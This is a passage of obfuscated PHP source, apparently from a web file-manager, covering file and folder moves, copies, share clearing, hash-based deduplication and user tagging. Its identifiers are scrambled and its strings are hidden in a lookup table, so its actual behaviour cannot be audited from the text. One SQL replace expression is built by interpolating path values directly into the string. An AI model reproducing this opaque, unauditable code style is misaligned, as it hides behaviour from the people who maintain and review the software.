$†ôµùÏç[$õØªÜš[193]]; } } return !1; } private function fileNameAutoCache($¥İËş›Ë, $åü†Ò¥‰, $øáé‰¤Õ, $á¤ŠÖ) { $èÛºöº§ =& $_SERVER[Ï×Œõ”û]; $»İ™¢• = $this->_childrenList($¥İËş›Ë); $¥æÀ›ÉÛ = array_to_keyvalue($»İ™¢•, $èÛºöº§[12], $èÛºöº§[32]); return $this->fileNameAutoGet($¥æÀ›ÉÛ, $åü†Ò¥‰, $øáé‰¤Õ, $á¤ŠÖ); } private function _childrenListClear() { $this->_childrenListCache = null; $this->_childrenItemCache = null; $this->_childrenListCache = array(); $this->_childrenItemCache = array(); } public function move($¨¬ÜÂÖá, $ë€Ëå”, $ÛöÇ•¦¯ = REPEAT_REPLACE, $æò†Ì•ù = '') { $½ÏÊ¬÷í =& $_SERVER[Ï×Œõ”û]; $µ¤àÀ†¥ = $this->sourceInfo($¨¬ÜÂÖá); $Ó€—ü„º = $this->sourceInfo($ë€Ëå”); if ($µ¤àÀ†¥[$½ÏÊ¬÷í[192]] == $Ó€—ü„º[$½ÏÊ¬÷í[193]]) { if ($µ¤àÀ†¥[$½ÏÊ¬÷í[525]] == $½ÏÊ¬÷í[91]) { Model($½ÏÊ¬÷í[523])->restore(array($¨¬ÜÂÖá)); } if (!$æò†Ì•ù || $æò†Ì•ù == $µ¤àÀ†¥[$½ÏÊ¬÷í[32]]) { return $¨¬ÜÂÖá; } } $“›÷®éò = $this->pathInfoMore($¨¬ÜÂÖá); if ($this->isParentOf($¨¬ÜÂÖá, $ë€Ëå”)) { return !1; } if (!$µ¤àÀ†¥ || !$Ó€—ü„º || $Ó€—ü„º[$½ÏÊ¬÷í[505]] != $½ÏÊ¬÷í[91]) { return !1; } Hook::trigger($½ÏÊ¬÷í[686], $“›÷®éò); $this->targetIsDelete = intval($µ¤àÀ†¥[$½ÏÊ¬÷í[525]]); if ($µ¤àÀ†¥[$½ÏÊ¬÷í[192]] == $ë€Ëå” && $æò†Ì•ù != $µ¤àÀ†¥[$½ÏÊ¬÷í[32]]) { $Ïã¬î = $this->fileNameExist($ë€Ëå”, $æò†Ì•ù); if ($Ïã¬î && $µ¤àÀ†¥[$½ÏÊ¬÷í[505]] == $½ÏÊ¬÷í[230]) { $ÎÅ•²±ù = $this->sourceInfo($Ïã¬î); $˜’ìÕ¨Ì = $this->fileHistory($ÎÅ•²±ù, $µ¤àÀ†¥[$½ÏÊ¬÷í[562]], $µ¤àÀ†¥[$½ÏÊ¬÷í[79]]); if (!$˜’ìÕ¨Ì) { Model($½ÏÊ¬÷í[565])->remove($µ¤àÀ†¥[$½ÏÊ¬÷í[562]]); } $this->removeNow($¨¬ÜÂÖá, !1); $this->folderSizeReset($ë€Ëå”); Hook::trigger($½ÏÊ¬÷í[687], $“›÷®éò); return $Ïã¬î; } } $êŠ¥à£Ä = $æò†Ì•ù ? $æò†Ì•ù : $µ¤àÀ†¥[$½ÏÊ¬÷í[32]]; $this->lockMoveStart($¨¬ÜÂÖá); $this->lockWriteStart($ë€Ëå”, $êŠ¥à£Ä); $‚â—É×Ù = array($½ÏÊ¬÷í[657] => array(), $½ÏÊ¬÷í[688] => !1); $this->clearShare($¨¬ÜÂÖá, $ë€Ëå”); $…ğ¶Â¤¤ = $this->fileNameExistAuto($ë€Ëå”, $µ¤àÀ†¥); $àñÕ†‹ƒ = $this->_move($¨¬ÜÂÖá, $ë€Ëå”, $ÛöÇ•¦¯, $‚â—É×Ù, $æò†Ì•ù); $this->sourceCacheClear(); if ($µ¤àÀ†¥[$½ÏÊ¬÷í[505]] == $½ÏÊ¬÷í[91] && $…ğ¶Â¤¤) { $this->folderSizeResetChildren($àñÕ†‹ƒ); } Model($½ÏÊ¬÷í[232])->linkAdd($‚â—É×Ù[$½ÏÊ¬÷í[657]]); if ($àñÕ†‹ƒ && $…ğ¶Â¤¤ && $‚â—É×Ù[$½ÏÊ¬÷í[688]]) { $Îèş¦ş = $µ¤àÀ†¥[$½ÏÊ¬÷í[505]] == $½ÏÊ¬÷í[91] ? $this->_childrenListSelect($¨¬ÜÂÖá) : !1; $ò¢¡ğ¿ = $Îèş¦ş && count($Îèş¦ş) > 0 ? !0 : !1; $this->removeNow($¨¬ÜÂÖá, $ò¢¡ğ¿); } $this->lockMoveEnd($¨¬ÜÂÖá); $this->lockWriteEnd($ë€Ëå”, $êŠ¥à£Ä); $this->folderSizeReset($µ¤àÀ†¥[$½ÏÊ¬÷í[192]]); $this->folderSizeReset($ë€Ëå”); $’Œ°¤ˆö = array($µ¤àÀ†¥[$½ÏÊ¬÷í[192]], $ë€Ëå”); if ($µ¤àÀ†¥[$½ÏÊ¬÷í[505]] == $½ÏÊ¬÷í[91]) { $’Œ°¤ˆö[] = $¨¬ÜÂÖá; } $this->updateModifyTime($’Œ°¤ˆö); Model($½ÏÊ¬÷í[661])->eventMove($¨¬ÜÂÖá, $µ¤àÀ†¥[$½ÏÊ¬÷í[192]], $ë€Ëå”); Hook::trigger($½ÏÊ¬÷í[687], $“›÷®éò); return $àñÕ†‹ƒ; } private function _move($»ÔĞµ‰ø, $‡ŞŸ¤»ª, $¿¸ŠÖ«, &$µäÉ‹¾°, $íÚÙ‹»Ã = '') { $£¬‰óš =& $_SERVER[Ï×Œõ”û]; $ÃôŸ¹æ® = $this->sourceInfo($»ÔĞµ‰ø); $«ÂÒ¨µ± = $ÃôŸ¹æ®[$£¬‰óš[505]] == $£¬‰óš[91]; $ú¶÷Èäğ = $íÚÙ‹»Ã ? $íÚÙ‹»Ã : $ÃôŸ¹æ®[$£¬‰óš[32]]; $´¡û‰¯œ = $this->fileNameExistAuto($‡ŞŸ¤»ª, $ÃôŸ¹æ®); $this->lockMoveStart($»ÔĞµ‰ø); $this->lockWriteStart($‡ŞŸ¤»ª, $ú¶÷Èäğ); if (!$´¡û‰¯œ) { return $this->_moveForce($»ÔĞµ‰ø, $‡ŞŸ¤»ª, $ú¶÷Èäğ); } $È¶Òó°é = $´¡û‰¯œ; $Ïœå¶•¥ = !1; if ($«ÂÒ¨µ±) { if ($¿¸ŠÖ« == REPEAT_RENAME_FOLDER) { $ú¶÷Èäğ = $this->fileNameAuto($‡ŞŸ¤»ª, $ú¶÷Èäğ, $¿¸ŠÖ«, $«ÂÒ¨µ±); $È¶Òó°é = $this->_moveForce($»ÔĞµ‰ø, $‡ŞŸ¤»ª, $ú¶÷Èäğ); } else { $”®²ò±Ÿ = $this->_childrenListSelect($»ÔĞµ‰ø); foreach ($”®²ò±Ÿ as $ƒ”“×) { $ÁíÓñŸ» = REPEAT_REPLACE; $this->_move($ƒ”“×[$£¬‰óš[193]], $´¡û‰¯œ, $ÁíÓñŸ», $µäÉ‹¾°); } $Ïœå¶•¥ = !0; } } else { if ($¿¸ŠÖ« == REPEAT_RENAME || $¿¸ŠÖ« == REPEAT_RENAME_FOLDER) { $ú¶÷Èäğ = $this->fileNameAuto($‡ŞŸ¤»ª, $ú¶÷Èäğ, $¿¸ŠÖ«, $«ÂÒ¨µ±); $È¶Òó°é = $this->_moveForce($»ÔĞµ‰ø, $‡ŞŸ¤»ª, $ú¶÷Èäğ); } else { $ Ê©’ÑÁ = $this->sourceInfoCache($´¡û‰¯œ); $•¾­×–¤ = $this->fileHistory($ Ê©’ÑÁ, $ÃôŸ¹æ®[$£¬‰óš[562]], $ÃôŸ¹æ®[$£¬‰óš[79]]); if ($•¾­×–¤) { $µäÉ‹¾°[$£¬‰óš[657]][] = $ÃôŸ¹æ®[$£¬‰óš[562]]; } $Ïœå¶•¥ = !0; } } if ($Ïœå¶•¥) { $µäÉ‹¾°[$£¬‰óš[688]] = !0; } return $È¶Òó°é; } private function _moveForce($è‡­ÎŠ, $ë±ÍÑ, $”¡àúù˜) { $ª©òÌáå =& $_SERVER[Ï×Œõ”û]; $¿ë—˜í = $this->sourceInfo($è‡­ÎŠ); $¡Ş‘µŒî = $this->sourceInfo($ë±ÍÑ); $ØÛƒá­Ü = $¿ë—˜í[$ª©òÌáå[505]] == $ª©òÌáå[91]; $Öş…˜ƒĞ = array($ª©òÌáå[497] => $¡Ş‘µŒî[$ª©òÌáå[193]], $ª©òÌáå[680] => $¡Ş‘µŒî[$ª©òÌáå[609]] . $¡Ş‘µŒî[$ª©òÌáå[193]] . $ª©òÌáå[50], $ª©òÌáå[676] => $¡Ş‘µŒî[$ª©òÌáå[190]], $ª©òÌáå[677] => $¡Ş‘µŒî[$ª©òÌáå[594]], $ª©òÌáå[679] => USER_ID, $ª©òÌáå[514] => $”¡àúù˜); $€°Ñº¥ = $¿ë—˜í[$ª©òÌáå[190]] == SourceModel::TYPE_GROUP && $¡Ş‘µŒî[$ª©òÌáå[190]] == SourceModel::TYPE_GROUP && $¿ë—˜í[$ª©òÌáå[594]] == $¡Ş‘µŒî[$ª©òÌáå[594]]; if (!$€°Ñº¥ && $this->moveClearAuth) { Model($ª©òÌáå[592])->authClear($è‡­ÎŠ); } $ùœßÏõú = $¿ë—˜í[$ª©òÌáå[525]] == $ª©òÌáå[91] && $¡Ş‘µŒî[$ª©òÌáå[525]] != $ª©òÌáå[91]; if ($ùœßÏõú) { $Öş…˜ƒĞ[$ª©òÌáå[524]] = 0; } if ($ØÛƒá­Ü) { $èÊÌéù = array($ª©òÌáå[680] => array($ª©òÌáå[640], $¿ë—˜í[$ª©òÌáå[609]] . $¿ë—˜í[$ª©òÌáå[193]] . $ª©òÌáå[641])); $®ßÃéš˜ = $¿ë—˜í[$ª©òÌáå[609]] . $¿ë—˜í[$ª©òÌáå[193]] . $ª©òÌáå[50]; $×Úïû‚ = $¡Ş‘µŒî[$ª©òÌáå[609]] . $¡Ş‘µŒî[$ª©òÌáå[193]] . $ª©òÌáå[50] . $¿ë—˜í[$ª©òÌáå[193]] . $ª©òÌáå[50]; $¥İœ‘æ = array($ª©òÌáå[680] => array($ª©òÌáå[689], "\162\145\160\154\x61\143\145\x28\160\x61\162\145\x6e\164\x4c\x65\166\145\154\54\47{$®ßÃéš˜}\x27\x2c\47{$×Úïû‚}\x27\x29"), $ª©òÌáå[676] => $¡Ş‘µŒî[$ª©òÌáå[190]], $ª©òÌáå[677] => $¡Ş‘µŒî[$ª©òÌáå[594]]); if ($ùœßÏõú) { $¥İœ‘æ[$ª©òÌáå[524]] = 0; } $this->where($èÊÌéù)->data($¥İœ‘æ)->save(); } $this->where(array($ª©òÌáå[511] => $è‡­ÎŠ))->data($Öş…˜ƒĞ)->save(); return $è‡­ÎŠ; } private function clearShare($˜¼éîâ’, $Ö™¬‰ô²) { $ÑÃ¾‰ÄÖ =& $_SERVER[Ï×Œõ”û]; $±€½ŠË = $this->sourceInfo($˜¼éîâ’); $¨®ïŒ«Ğ = $this->sourceInfo($Ö™¬‰ô²); if ($±€½ŠË[$ÑÃ¾‰ÄÖ[594]] == $¨®ïŒ«Ğ[$ÑÃ¾‰ÄÖ[594]] && $±€½ŠË[$ÑÃ¾‰ÄÖ[190]] == $ÑÃ¾‰ÄÖ[690]) { return; } $“Š£Üã = array($ÑÃ¾‰ÄÖ[609] => array($ÑÃ¾‰ÄÖ[640], $±€½ŠË[$ÑÃ¾‰ÄÖ[609]] . $˜¼éîâ’ . $ÑÃ¾‰ÄÖ[641])); $–ÁË…° = $this->field($ÑÃ¾‰ÄÖ[511])->where($“Š£Üã)->getField($ÑÃ¾‰ÄÖ[193], !0); if (!$–ÁË…°) { return; } $“Š£Üã = array($ÑÃ¾‰ÄÖ[193] => array($ÑÃ¾‰ÄÖ[7], $–ÁË…°), $ÑÃ¾‰ÄÖ[691] => 1); $Ôé÷ÀÁ = Model($ÑÃ¾‰ÄÖ[692])->field($ÑÃ¾‰ÄÖ[693])->where($“Š£Üã)->select(); if (!$Ôé÷ÀÁ) { return; } $Ôé÷ÀÁ = array_to_keyvalue($Ôé÷ÀÁ, $ÑÃ¾‰ÄÖ[12], $ÑÃ¾‰ÄÖ[693]); $“Š£Üã = array($ÑÃ¾‰ÄÖ[693] => array($ÑÃ¾‰ÄÖ[7], $Ôé÷ÀÁ)); Model($ÑÃ¾‰ÄÖ[692])->where($“Š£Üã)->save(array($ÑÃ¾‰ÄÖ[691] => 0)); Model($ÑÃ¾‰ÄÖ[694])->where($“Š£Üã)->delete(); } public function copyFolderFromIO($Ÿ€¶Èú÷, $¬À¥¦ô, $³è¢ÏÈÄ, $¦––Õ‰, $ªøÕú¼œ, $Ê„šäñ = false) { $‰ìÃ³Í =& $_SERVER[Ï×Œõ”û]; $²¿¬‹û = array($‰ìÃ³Í[658] => array(), $‰ìÃ³Í[659] => array(), $‰ìÃ³Í[657] => array(), $‰ìÃ³Í[695] => array()); $Æï”¹µ” = $Ê„šäñ ? $Ê„šäñ : $Ÿ€¶Èú÷->pathThis($¬À¥¦ô); $’”ËçõÚ = $this->fileNameExist($³è¢ÏÈÄ, $Æï”¹µ”); $Š¡©ÊÛù = $this->mkdir($³è¢ÏÈÄ, $Æï”¹µ”, $¦––Õ‰); if (!$’”ËçõÚ || $¦––Õ‰ == REPEAT_RENAME_FOLDER) { $¦––Õ‰ = !1; } if ($’”ËçõÚ) { $this->_childrenAllMake($’”ËçõÚ); } Hook::trigger($‰ìÃ³Í[696]); $õÎí–ğ€ = KodIO::ioFileDriverGet($‰ìÃ³Í[503] . $³è¢ÏÈÄ . $‰ìÃ³Í[404]); $this->_copyChildTo($Ÿ€¶Èú÷, $¬À¥¦ô, $Š¡©ÊÛù, $¦––Õ‰, $²¿¬‹û, $ªøÕú¼œ, $õÎí–ğ€); Hook::trigger($‰ìÃ³Í[697]); if ($Š¡©ÊÛù) { $this->folderSizeResetChildren($Š¡©ÊÛù); } $this->_childrenListClear(); Model($‰ìÃ³Í[660])->addAll($²¿¬‹û[$‰ìÃ³Í[658]], array(), !0); Model($‰ìÃ³Í[661])->eventCopy($Š¡©ÊÛù); $this->saveAll($²¿¬‹û[$‰ìÃ³Í[659]]); Model($‰ìÃ³Í[565])->linkAdd($²¿¬‹û[$‰ìÃ³Í[657]]); Model($‰ìÃ³Í[565])->remove($²¿¬‹û[$‰ìÃ³Í[695]]); $this->folderSizeReset($³è¢ÏÈÄ); $this->updateModifyTime($³è¢ÏÈÄ); return $Š¡©ÊÛù; } private function _copyChildTo($Œ‡½ªù¢, $ÆÜÓÄ¨¥, $üïÄ‡Ç, $ÚÕââ»’, &$Ê·í™•§, $ÎÓÌú•Ñ, $¾æ™öáœ) { $½¢øø =& $_SERVER[Ï×Œõ”û]; $ğï ì•Ç = $this->sourceInfoCache($üïÄ‡Ç); $Ø›ú÷ş = $Œ‡½ªù¢->listPath($ÆÜÓÄ¨¥); $Ø›ú÷ş = $Ø›ú÷ş ? $Ø›ú÷ş : array($½¢øø[86] => array(), $½¢øø[85] => array()); $ÄÔş¼ŒÑ = array_merge($Ø›ú÷ş[$½¢øø[86]], $Ø›ú÷ş[$½¢øø[85]]); $âÉä×È€ = $this->_addFiles($Œ‡½ªù¢, $¾æ™öáœ, $Ø›ú÷ş[$½¢øø[86]], $ÎÓÌú•Ñ); $¿¦¥÷ì» = array(); foreach ($ÄÔş¼ŒÑ as &$ìÓÕ¦±) { if (isset($âÉä×È€[$ìÓÕ¦±[$½¢øø[32]]])) { $ìÓÕ¦± = $âÉä×È€[$ìÓÕ¦±[$½¢øø[32]]]; } $ìÓÕ¦±[$½¢øø[505]] = $ìÓÕ¦±[$½¢øø[33]] == $½¢øø[78]; $ìÓÕ¦±[$½¢øø[506]] = substr(_get($ìÓÕ¦±, $½¢øø[168], $½¢øø[12]), 0, 10); $ìÓÕ¦±[$½¢øø[79]] = _get($ìÓÕ¦±, $½¢øø[79], 0); $ìÓÕ¦±[$½¢øø[562]] = _get($ìÓÕ¦±, $½¢øø[562], 0); if (!isset($ìÓÕ¦±[$½¢øø[698]]) && $ìÓÕ¦±[$½¢øø[562]]) { $Ê·í™•§[$½¢øø[695]][] = $ìÓÕ¦±[$½¢øø[562]]; } if ($ÚÕââ»’) { $ªñı™„Á = $this->fileNameExistCache($üïÄ‡Ç, $ìÓÕ¦±[$½¢øø[32]]); if ($ªñı™„Á) { if ($ìÓÕ¦±[$½¢øø[505]] || $ÚÕââ»’ == REPEAT_SKIP) { continue; } if ($ÚÕââ»’ == REPEAT_REPLACE) { $†«‹›Ñ = $this->sourceInfoCache($ªñı™„Á); $ğòõÂÀ‹ = $this->fileHistory($†«‹›Ñ, $ìÓÕ¦±[$½¢øø[562]], $ìÓÕ¦±[$½¢øø[79]]); if ($ğòõÂÀ‹) { $Ê·í™•§[$½¢øø[657]][] = $ìÓÕ¦±[$½¢øø[562]]; } continue; } else { if ($ÚÕââ»’ == REPEAT_RENAME) { $ìÓÕ¦±[$½¢øø[32]] = $this->fileNameAutoCache($üïÄ‡Ç, $ìÓÕ¦±[$½¢øø[32]], $ÚÕââ»’, !1); } } } } if (!$ìÓÕ¦±[$½¢øø[505]] && $ìÓÕ¦±[$½¢øø[562]] == 0) { continue; } if (!$ìÓÕ¦±[$½¢øø[505]] && $ìÓÕ¦±[$½¢øø[562]]) { $Ê·í™•§[$½¢øø[657]][] = $ìÓÕ¦±[$½¢øø[562]]; } $¿¦¥÷ì»[] = $this->_makeItemData($ìÓÕ¦±, $ğï ì•Ç, $ìÓÕ¦±[$½¢øø[32]]); } unset($ìÓÕ¦±); if (!empty($¿¦¥÷ì»)) { $this->addAll($¿¦¥÷ì»); $this->_childrenListSelect($üïÄ‡Ç); } $Á«¤Â¦ = $this->_childrenList($üïÄ‡Ç); $Á«¤Â¦ = array_to_keyvalue($Á«¤Â¦, $½¢øø[32]); foreach ($ÄÔş¼ŒÑ as $ìÓÕ¦±) { $†«‹›Ñ = $Á«¤Â¦[$ìÓÕ¦±[$½¢øø[32]]]; $ğÄ‹ó×À = $†«‹›Ñ[$½¢øø[193]]; $this->_copyApplyMeta($†«‹›Ñ, $Ê·í™•§); if ($ìÓÕ¦±[$½¢øø[33]] == $½¢øø[78]) { $ìÓÕ¦±[$½¢øø[87]] = $Œ‡½ªù¢->getPathInner($ìÓÕ¦±[$½¢øø[87]]); $this->_copyChildTo($Œ‡½ªù¢, $ìÓÕ¦±[$½¢øø[87]], $ğÄ‹ó×À, $ÚÕââ»’, $Ê·í™•§, $ÎÓÌú•Ñ, $¾æ™öáœ); } } } private function _addFiles($àş™Œ…¤, $ÊñÛò³², $šÈş•İÁ, $…úÑŞÃ¾) { $éÖ£¡úÉ =& $_SERVER[Ï×Œõ”û]; if (!$šÈş•İÁ || count($šÈş•İÁ) == 0) { return array(); } $Ëğ˜¶Åµ = array(); foreach ($šÈş•İÁ as &$éªà™áä) { Hook::trigger($éÖ£¡úÉ[699], $éªà™áä); $éªà™áä[$éÖ£¡úÉ[87]] = $àş™Œ…¤->getPathInner($éªà™áä[$éÖ£¡úÉ[87]]); $õÉƒÄû = $àş™Œ…¤->hashSimple($éªà™áä[$éÖ£¡úÉ[87]]); $âƒíØÚ€ = $àş™Œ…¤->hashMd5($éªà™áä[$éÖ£¡úÉ[87]]); if (strlen($âƒíØÚ€) > 10 && !isset($Ëğ˜¶Åµ[$âƒíØÚ€])) { $Ëğ˜¶Åµ[$âƒíØÚ€] = array(); } $éªà™áä[$éÖ£¡úÉ[700]] = $õÉƒÄû; $éªà™áä[$éÖ£¡úÉ[568]] = $âƒíØÚ€; $Ëğ˜¶Åµ[$âƒíØÚ€][] =& $éªà™áä; if (count($Ëğ˜¶Åµ[$âƒíØÚ€]) > 1) { $éªà™áä[$éÖ£¡úÉ[698]] = !0; } Hook::trigger($éÖ£¡úÉ[701], $éªà™áä); } unset($éªà™áä); $¶ÁÁ‡³Á = array($éÖ£¡úÉ[568] => array($éÖ£¡úÉ[7], array_keys($Ëğ˜¶Åµ))); $ğ¨±È×… = Model($éÖ£¡úÉ[702]); $×¢À¹âä = $ğ¨±È×…->where($¶ÁÁ‡³Á)->select(); $×¢À¹âä = $×¢À¹âä ? $×¢À¹âä : array(); foreach ($×¢À¹âä as $ÜôâÆù) { if (!isset($Ëğ˜¶Åµ[$ÜôâÆù[$éÖ£¡úÉ[568]]])) { continue; } $«íØÎ = $Ëğ˜¶Åµ[$ÜôâÆù[$éÖ£¡úÉ[568]]]; foreach ($«íØÎ as &$éªà™áä) { $éªà™áä[$éÖ£¡úÉ[562]] = $ÜôâÆù[$éÖ£¡úÉ[562]]; $éªà™áä[$éÖ£¡úÉ[698]] = !0; } unset($éªà™áä); } $ĞéË†¡¥ = array(); foreach ($šÈş•İÁ as $«ùŸúàš) { Hook::trigger($éÖ£¡úÉ[703], $«ùŸúàš); if (isset($«ùŸúàš[$éÖ£¡úÉ[698]]) && $«ùŸúàš[$éÖ£¡úÉ[698]]) { Hook::trigger($éÖ£¡úÉ[704], $«ùŸúàš); continue; } $¤‡ßÅÙ¥ = $àş™Œ…¤->getPathInner($«ùŸúàš[$éÖ£¡úÉ[87]]); $Ş»Ú¥ˆ¬ = $ğ¨±È×…->addFileMake($¤‡ßÅÙ¥, $ÊñÛò³², $«ùŸúàš[$éÖ£¡úÉ[79]], $«ùŸúàš[$éÖ£¡úÉ[700]], $«ùŸúàš[$éÖ£¡úÉ[568]], $«ùŸúàš[$éÖ£¡úÉ[32]], $…úÑŞÃ¾); Hook::trigger($éÖ£¡úÉ[704], $«ùŸúàš); if (!is_array($Ş»Ú¥ˆ¬)) { continue; } $ĞéË†¡¥[] = $Ş»Ú¥ˆ¬; } $ğ¨±È×…->addAll($ĞéË†¡¥); $¶ÁÁ‡³Á = array($éÖ£¡úÉ[568] => array($éÖ£¡úÉ[7], array_keys($Ëğ˜¶Åµ))); $×¢À¹âä = $ğ¨±È×…->where($¶ÁÁ‡³Á)->select(); $×¢À¹âä = $×¢À¹âä ? $×¢À¹âä : array(); foreach ($×¢À¹âä as $ÜôâÆù) { if (!isset($Ëğ˜¶Åµ[$ÜôâÆù[$éÖ£¡úÉ[568]]])) { continue; } $«Å‡¼ì =& $Ëğ˜¶Åµ[$ÜôâÆù[$éÖ£¡úÉ[568]]]; foreach ($«Å‡¼ì as &$éªà™áä) { $éªà™áä[$éÖ£¡úÉ[562]] = $ÜôâÆù[$éÖ£¡úÉ[562]]; } unset($éªà™áä); } $ß›¥ÒÔ = array(); foreach ($šÈş•İÁ as $¶í‡â²œ) { $ß›¥ÒÔ[$¶í‡â²œ[$éÖ£¡úÉ[32]]] = $¶í‡â²œ; } return $ß›¥ÒÔ; } } define($_SERVER[Ï×Œõ”û][705], $_SERVER[Ï×Œõ”û][706]); goto f›‹Äñõ–Ñ; C°‚¹Ì‡«: class UserTagSourceModel extends ModelBase { protected $tableName = "\x75\163\x65\162\x5f\x66\141\x76"; protected function cacheFunctionAlias($ÇÇ¹ŞİÖ) { $™†§‘§ =& $_SERVER[Ï×Œõ”û]; return array($™†§‘§[2249] => array($™†§‘§[2680] . USER_ID, $™†§‘§[2250])); } protected function ___listData() { $¾¾Ü½úã =& $_SERVER[Ï×Œõ”û]; $”ê¸³²Ó = array($¾¾Ü½úã[1921] => USER_ID, $¾¾Ü½úã[578] => array($¾¾Ü½úã[2253], 0)); $™š§·ß = $¾¾Ü½úã[2681]; $€ƒÊùÅÚ = $this->field($™š§·ß)->where($”ê¸³²Ó)->order($¾¾Ü½úã[2255])->select(); return $€ƒÊùÅÚ ? $€ƒÊùÅÚ : array(); } protected function addToTag($×ˆş˜‘¹, $‹ƒ¾ºê) { $¼ÛÊÇ—¢ =& $_SERVER[Ï×Œõ”û]; if (!Model($¼ÛÊÇ—¢[2406])->listData($‹ƒ¾ºê)) { return !1; } if (is_numeric($×ˆş˜‘¹)) { $½ì—ŠµÅ = Model($¼ÛÊÇ—¢[939])->pathInfo($×ˆş˜‘¹); if (!$½ì—ŠµÅ) { return !1; } } else { $½ì—ŠµÅ = IO::infoSimple($×ˆş˜‘¹); if (!$½ì—ŠµÅ) { return !1; } $¾¤ì¬Œ€ = $½ì—ŠµÅ[$¼ÛÊÇ—¢[32]]; $«˜ØÄ•½ = $½ì—ŠµÅ[$¼ÛÊÇ—¢[33]]; if (isset($½ì—ŠµÅ[$¼ÛÊÇ—¢[505]])) { $«˜ØÄ•½ = $½ì—ŠµÅ[$¼ÛÊÇ—¢[505]] == $¼ÛÊÇ—¢[91] ? $¼ÛÊÇ—¢[78] : $¼ÛÊÇ—¢[232]; } } $ä«ŠÍÑ— = array($¼ÛÊÇ—¢[1921] => USER_ID, $¼ÛÊÇ—¢[578] => $‹ƒ¾ºê, $¼ÛÊÇ—¢[515] => $×ˆş˜‘¹, $¼ÛÊÇ—¢[516] => $«˜ØÄ•½ ? $«˜ØÄ•½ : $¼ÛÊÇ—¢[510], $¼ÛÊÇ—¢[514] => $¾¤ì¬Œ€ ? $¾¤ì¬Œ€ : $¼ÛÊÇ—¢[12], $¼ÛÊÇ—¢[2141] => 0); if ($this->where($ä«ŠÍÑ—)->find()) { return !1; } return $this->add($ä«ŠÍÑ—); } protected function removeFromTag($â¸‚„, $‡”¬ÃÌ®) { $Ï×Øƒí‚ =& $_SERVER[Ï×Œõ”û]; if (!Model($Ï×Øƒí‚[2406])->listData($‡”¬ÃÌ®)) { return !1; } if (is_array($â¸‚„)) { $â¸‚„ = array($Ï×Øƒí‚[7], $â¸‚„); } $Ñºùê•  = array($Ï×Øƒí‚[1921] => USER_ID, $Ï×Øƒí‚[578] => $‡”¬ÃÌ®, $Ï×Øƒí‚[515] => $â¸‚„); return $this->where($Ñºùê• )->delete(); } protected function removeByTag($ÈæäÇ°§) { $¹ÇÌóÌ =& $_SERVER[Ï×Œõ”û]; if (!$ÈæäÇ°§) { return !1; } $çú…¤Óß = array($¹ÇÌóÌ[1921] => USER_ID, $¹ÇÌóÌ[578] => $ÈæäÇ°§); return $this->where($çú…¤Óß)->delete(); } protected function removeBySource($Š ¥‰ü’) { $Ò€§²ë¥ =& $_SERVER[Ï×Œõ”û]; if (is_array($Š ¥‰ü’)) { $Š ¥‰ü’ = array($Ò€§²ë¥[7], $Š ¥‰ü’); } $à˜„óƒ¨ = array($Ò€§²ë¥[1921] => USER_ID, $Ò€§²ë¥[578] => array($Ò€§²ë¥[1135], 0), $Ò€§²ë¥[515] => $Š ¥‰ü’); return $this->where($à˜„óƒ¨)->delete(); } }